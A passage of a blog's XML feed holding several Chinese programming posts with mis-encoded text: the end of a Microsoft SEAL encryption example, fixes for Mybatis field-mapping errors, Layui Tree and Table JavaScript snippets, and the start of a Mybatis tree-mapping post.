operator">&lt;</span><span class="token keyword">double</span><span class="token operator">></span>result_dd_cache<span class="token punctuation">;</span>decryptor<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>encrypt_d<span class="token punctuation">,</span> plain_dd_cache<span class="token punctuation">)</span><span class="token punctuation">;</span>ckks_encoder<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>plain_dd_cache<span class="token punctuation">,</span> result_dd_cache<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// judge âˆƒd âˆˆ dâˆ—: d > 0 ? accept : reject</span><span class="token keyword">bool</span> ok <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">auto</span> len <span class="token operator">=</span> result_dd_cache<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>result_dd_cache<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        ok <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>string ans <span class="token operator">=</span> ok <span class="token operator">?</span> <span class="token string">"accept"</span> <span class="token operator">:</span> <span class="token string">"reject"</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> ans <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">//è¾“å‡ºæœ€åç»“æœ</span></code></pre>              </div>            </details><p><img src="https://img-blog.csdnimg.cn/img_convert/eb2e7a41898c866db7ebd12df2fae661.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/img_convert/eb2e7a41898c866db7ebd12df2fae661.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210203183215036"></p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Microsoft SEAL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Seal </tag>
            
            <tag> åŒæ€åŠ å¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mybatis  XXX.ReflectionException_ There Is No Getter for Name XXXé—®é¢˜</title>
      <link href="/posts/12adf317/"/>
      <url>/posts/12adf317/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><blockquote><p>@auther by sizaif</p></blockquote><h1>è§£å†³æ–¹æ³•</h1><p><strong>é¦–å…ˆ,è¿™ä¸ªè‚¯å®šæ˜¯å› ä¸ºæ•°æ®åº“è¡¨ä¸­çš„å­—æ®µå,å’Œå®ä½“ç±»ä¸­çš„å­—æ®µåæ˜ å°„å¤±è´¥å¼•èµ·çš„;</strong></p><h2 id="1-æŸ¥çœ‹-resultMap-æ˜¯å¦æ‹¼å†™é”™è¯¯">1: æŸ¥çœ‹ <resultMap> æ˜¯å¦æ‹¼å†™é”™è¯¯</h2><div class="story post-story"><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token comment">&lt;!--æ˜ å°„è¡¨--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resultMap</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UsersMap<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.sizaif.emsdemo.pojo.User.Users<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--columnæ•°æ®åº“ä¸­çš„å­—æ®µï¼Œpropertyå®ä½“ç±»ä¸­çš„å±æ€§--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>INTEGER<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>createDate<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>createDate<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>VARCHAR<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modifyDate<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modifyDate<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>VARCHAR<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>isEnabled<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>isEnabled<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>INTEGER<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>isLocked<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>isLocked<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>INTEGER<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lastLoginDate<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lastLoginDate<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>VARCHAR<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lastLoginIp<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lastLoginIp<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>VARCHAR<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lockDate<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lockDate<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>VARCHAR<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>uname<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>VARCHAR<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>encodePassword<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>VARCHAR<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>role<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>role<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>VARCHAR<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resultMap</span><span class="token punctuation">></span></span></code></pre></div><h2 id="2-æŸ¥çœ‹-sqlåŠ¨æ€æ’å…¥æˆ–æ›´æ–°è¯­å¥ä¸­å­—æ®µæ˜¯å¦æ‹¼å†™é”™è¯¯ä¸å®ä½“ç±»ä¸­å­—æ®µä¸ç¬¦">2: æŸ¥çœ‹ sqlåŠ¨æ€æ’å…¥æˆ–æ›´æ–°è¯­å¥ä¸­å­—æ®µæ˜¯å¦æ‹¼å†™é”™è¯¯ä¸å®ä½“ç±»ä¸­å­—æ®µä¸ç¬¦**</h2><div class="story post-story"><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if</span> <span class="token attr-name">test</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>XXXå®ä½“ç±»å­—æ®µå != null<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>XXXæ•°æ®åº“å­—æ®µå,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if</span><span class="token punctuation">></span></span></code></pre></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Mybatis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Mybatis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Layui Tree è·å–å¤é€‰æ¡†é€‰ä¸­èŠ‚ç‚¹çš„Id</title>
      <link href="/posts/b7de2574/"/>
      <url>/posts/b7de2574/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><blockquote><p>@auther by sizaif</p></blockquote><h1>è¯´æ˜</h1><p>å®˜æ–¹æ–‡æ¡£æä¾›çš„ä»£ç åªèƒ½è·å–åˆ°æ ¹èŠ‚ç‚¹çš„id,æ²¡æœ‰è¿›è¡Œæ ‘éå†,æ— æ³•è·å–åˆ°å­æ ‘çš„id.</p><h1>Code</h1><p>å®˜æ–¹æ–‡æ¡£æä¾›çš„</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">tree<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  elem<span class="token operator">:</span> <span class="token string">'#test'</span>  <span class="token punctuation">,</span>data<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment">//æ•°æ®æº</span>  <span class="token punctuation">,</span>id<span class="token operator">:</span> <span class="token string">'demoId'</span> <span class="token comment">//å®šä¹‰ç´¢å¼•</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è·å¾—é€‰ä¸­çš„èŠ‚ç‚¹</span><span class="token keyword">var</span> checkData <span class="token operator">=</span> tree<span class="token punctuation">.</span><span class="token function">getChecked</span><span class="token punctuation">(</span><span class="token string">'demoId'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æˆ‘çš„ä»£ç </p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> treecheckdata  <span class="token operator">=</span> tree<span class="token punctuation">.</span><span class="token function">getChecked</span><span class="token punctuation">(</span><span class="token string">'demoId'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> nodeIds <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>nodeIds <span class="token operator">=</span> <span class="token function">getCheckedId</span><span class="token punctuation">(</span>treecheckdata<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// æµ‹è¯•</span><span class="token keyword">var</span> permList <span class="token operator">=</span> nodeIds<span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"permList:"</span><span class="token operator">+</span>permList<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// è·å–é€‰ä¸­èŠ‚ç‚¹çš„id</span><span class="token keyword">function</span> <span class="token function">getCheckedId</span><span class="token punctuation">(</span><span class="token parameter">jsonObj</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> id <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    $<span class="token punctuation">.</span><span class="token function">each</span><span class="token punctuation">(</span>jsonObj<span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">index<span class="token punctuation">,</span> item</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>id <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            id <span class="token operator">=</span> id <span class="token operator">+</span> <span class="token string">","</span> <span class="token operator">+</span> item<span class="token punctuation">.</span>id<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            id <span class="token operator">=</span> item<span class="token punctuation">.</span>id<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token function">getCheckedId</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span>children<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            id <span class="token operator">=</span> id <span class="token operator">+</span> <span class="token string">","</span> <span class="token operator">+</span> i<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> id<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1>æ•ˆæœå›¾</h1><p><img src="https://img-blog.csdnimg.cn/20200411154638307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200411154638307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200411154705177.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200411154705177.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Js </tag>
            
            <tag> Layui </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Layui Table è§£å†³ä»åå°ä¼ å…¥æ•°æ®ä¸ºäºŒç»´æ•°ç»„æ¨¡å¼,å³å¸¦æœ‰å­ç±»çš„æ•°æ®æ ¼å¼</title>
      <link href="/posts/2b51004/"/>
      <url>/posts/2b51004/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><blockquote><p>@auther by sizaif</p></blockquote><h1>åå°ä¼ å…¥çš„æ ¼å¼</h1><p><img src="https://img-blog.csdnimg.cn/20200504124156316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200504124156316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1>å‰å°å¤„ç†</h1><details green><summary> code </summary>              <div class='content'>              <pre class="language-js" data-language="js"><code class="language-js"><span class="token punctuation">,</span>response<span class="token operator">:</span><span class="token punctuation">&#123;</span>                statusName<span class="token operator">:</span> <span class="token string">'code'</span> <span class="token comment">//æ•°æ®çŠ¶æ€çš„å­—æ®µåç§°ï¼Œé»˜è®¤ï¼šcode</span>                <span class="token punctuation">,</span>statusCode<span class="token operator">:</span> <span class="token number">200</span> <span class="token comment">//æˆåŠŸçš„çŠ¶æ€ç ï¼Œé»˜è®¤ï¼š0</span>                <span class="token punctuation">,</span>countName<span class="token operator">:</span> <span class="token string">'totals'</span> <span class="token comment">//æ•°æ®æ€»æ•°çš„å­—æ®µåç§°ï¼Œé»˜è®¤ï¼šcount</span>                <span class="token punctuation">,</span>dataName<span class="token operator">:</span> <span class="token string">'list'</span> <span class="token comment">//æ•°æ®åˆ—è¡¨çš„å­—æ®µåç§°ï¼Œé»˜è®¤ï¼šdata</span>            <span class="token punctuation">&#125;</span>            <span class="token punctuation">,</span><span class="token function-variable function">parseData</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//res å³ä¸ºåŸå§‹è¿”å›çš„æ•°æ®</span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>                    <span class="token string">"code"</span><span class="token operator">:</span>res<span class="token punctuation">.</span>code<span class="token punctuation">,</span> <span class="token comment">//è§£ææ¥å£çŠ¶æ€</span>                    <span class="token string">"msg"</span><span class="token operator">:</span> res<span class="token punctuation">.</span>message<span class="token punctuation">,</span> <span class="token comment">//è§£ææç¤ºæ–‡æœ¬</span>                    <span class="token string">"totals"</span><span class="token operator">:</span> res<span class="token punctuation">.</span>totals<span class="token punctuation">,</span> <span class="token comment">//è§£ææ•°æ®é•¿åº¦</span>                    <span class="token string">"list"</span><span class="token operator">:</span> res<span class="token punctuation">.</span>list <span class="token comment">//è§£ææ•°æ®åˆ—è¡¨</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token punctuation">,</span>cols<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token comment">//è¡¨å¤´</span>                <span class="token punctuation">&#123;</span>field<span class="token operator">:</span> <span class="token string">'users'</span><span class="token punctuation">,</span> title<span class="token operator">:</span> <span class="token string">'ä¸Šæ¬¡ç™»å½•IP'</span><span class="token punctuation">,</span>sort<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token function-variable function">templet</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> d<span class="token punctuation">.</span>users<span class="token punctuation">.</span>lastLoginIp<span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span>                <span class="token punctuation">,</span><span class="token punctuation">&#123;</span>field<span class="token operator">:</span> <span class="token string">'users'</span><span class="token punctuation">,</span> title<span class="token operator">:</span> <span class="token string">'è§’è‰²'</span><span class="token punctuation">,</span>sort<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token function-variable function">templet</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> d<span class="token punctuation">.</span>users<span class="token punctuation">.</span>role<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>            <span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre>              </div>            </details><h1>æ•ˆæœ</h1><p><img src="https://img-blog.csdnimg.cn/20200504124419953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200504124419953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Js </tag>
            
            <tag> Layui </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mybatis å•è¡¨è‡ªå…³è” å®ç°æ ‘ç»“æ„çš„å‡ ç§æ–¹å¼</title>
      <link href="/posts/843fdcdc/"/>
      <url>/posts/843fdcdc/</url>
      
        <content type="html"><![CDATA[<blockquote><p>@auther by sizaif</p></blockquote><p>@<a href="%E7%9B%AE%E5%BD%95">TOC</a></p><h1>ç»“æ„</h1><h2 id="Bean">Bean</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@JsonIdentityInfo</span><span class="token punctuation">(</span> generator <span class="token operator">=</span> <span class="token class-name">ObjectIdGenerators<span class="token punctuation">.</span>IntSequenceGenerator</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PermissionVO</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span><span class="token punctuation">&#123;</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2783081162690878303L</span><span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token class-name">Integer</span> id<span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Integer</span> pid<span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token class-name">Integer</span> istype<span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token class-name">String</span> code<span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token class-name">String</span> page<span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token keyword">boolean</span> checked<span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token keyword">boolean</span> <span class="token keyword">open</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">PermissionVO</span><span class="token punctuation">></span></span> children<span class="token punctuation">;</span></code></pre>              </div>            </details><h1>æ³•ä¸€:ä½¿ç”¨mybatisæ˜ å°„å®ç°</h1></div><h2 id="mabatis-xmlé…ç½®">mabatis.xmlé…ç½®</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token comment">&lt;!--=Start findPerms æŸ¥æ‰¾æƒé™æ ‘åˆ—è¡¨ ç»“æœé›†æ˜ å°„--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resultMap</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>findPermissionMap<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.sizaif.emsdemo.dto.PermissionVO<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pid<span class="token punctuation">"</span></span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pid<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>istype<span class="token punctuation">"</span></span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>istype<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>code<span class="token punctuation">"</span></span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>code<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>page<span class="token punctuation">"</span></span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>page<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>collection</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>children<span class="token punctuation">"</span></span>  <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span> <span class="token attr-name">ofType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.sizaif.emsdemo.dto.PermissionVO<span class="token punctuation">"</span></span> <span class="token attr-name">select</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>findChildPerm<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token 